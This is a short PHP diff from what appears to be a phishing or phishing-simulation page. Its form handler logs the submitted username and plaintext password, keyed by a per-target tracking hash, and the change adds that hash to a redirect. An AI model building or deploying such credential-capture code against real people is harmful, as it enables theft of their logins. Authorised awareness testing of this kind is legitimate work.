@@ -20,7 +20,7 @@ if($hash && $logFile){
 if($_SERVER['REQUEST_METHOD']=='POST' && $hash && $logFile){
     $event=['event'=>'submitted','hash'=>$hash,'time'=>time(),'user'=>$_POST['user']??'','pass'=>$_POST['pass']??''];
     file_put_contents($logFile,json_encode($event)."\n",FILE_APPEND);
-    header('Location: guru.php');
+    header('Location: guru.php?id=' . urlencode($hash));
     exit;
 }
 ?>
